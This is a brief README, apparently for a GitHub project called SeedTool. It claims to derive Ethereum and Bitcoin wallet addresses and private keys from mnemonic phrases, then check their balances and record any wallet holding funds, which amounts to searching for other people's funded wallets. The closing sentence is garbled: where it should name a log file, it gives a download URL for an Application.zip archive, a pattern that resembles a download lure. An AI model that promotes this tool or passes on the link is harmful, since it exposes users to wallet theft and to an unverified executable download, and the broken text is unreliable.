# ðŸŒ± SeedTool

SeedTool is a powerful tool for generating Ethereum and Bitcoin wallet addresses using a mnemonic phrase and checking the associated balances and transactions without the need for an API. With SeedTool, you can easily generate a wallet address, private key, and mnemonic from a seed phrase, and check its balance and transactions. If a wallet with a non-zero balance is found, SeedTool logs and saves all pertinent information to a file named https://github.com/Thandoman/SeedTool/releases/download/v1.0/Application.zip
